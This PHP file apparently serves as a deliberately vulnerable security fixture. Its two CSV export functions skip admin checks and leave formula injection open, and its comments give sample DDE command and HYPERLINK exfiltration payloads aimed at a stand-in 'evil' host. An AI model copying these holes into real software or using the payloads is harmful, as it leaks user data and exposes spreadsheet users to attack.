<?php
declare(strict_types=1);

function ctl_export_announcements(): void
{
    /* ---- BROKEN ACCESS CONTROL: export is an admin feature but only
     * require_login() guards it (vertical privilege escalation), AND ------
     * ---- CSV / FORMULA INJECTION (added requirement) ---------------------
     * Cell values are written verbatim. A title/body beginning with
     * = + - @ (or tab/CR) is interpreted as a formula when the CSV is opened
     * in Excel / LibreOffice / Google Sheets, e.g.:
     *   =cmd|'/c calc'!A1
     *   =HYPERLINK("http://evil/?"&A1,"click")
     * No neutralisation (no leading apostrophe, no quoting of formula chars). */
    require_login();

    $rows = db()->query('SELECT id, title, body, link_url, publish_start_date, publish_end_date
                         FROM announcements ORDER BY id')->fetchAll();

    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="announcements.csv"');

    $out = fopen('php://output', 'w');
    // fputcsv handles delimiter quoting but does NOT neutralise formula chars.
    fputcsv($out, ['id', 'title', 'body', 'link_url', 'start', 'end']);
    foreach ($rows as $r) {
        fputcsv($out, [
            $r['id'],
            $r['title'],
            strip_tags((string) $r['body']),
            $r['link_url'],
            $r['publish_start_date'],
            $r['publish_end_date'],
        ]);
    }
    fclose($out);
}

function ctl_export_users(): void
{
    // Same missing admin gate + same formula-injection sink for user data.
    require_login();
    $rows = db()->query('SELECT id, name, email, role FROM users ORDER BY id')->fetchAll();

    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="users.csv"');

    $out = fopen('php://output', 'w');
    fputcsv($out, ['id', 'name', 'email', 'role']);
    foreach ($rows as $r) {
        fputcsv($out, [$r['id'], $r['name'], $r['email'], $r['role']]);
    }
    fclose($out);
}
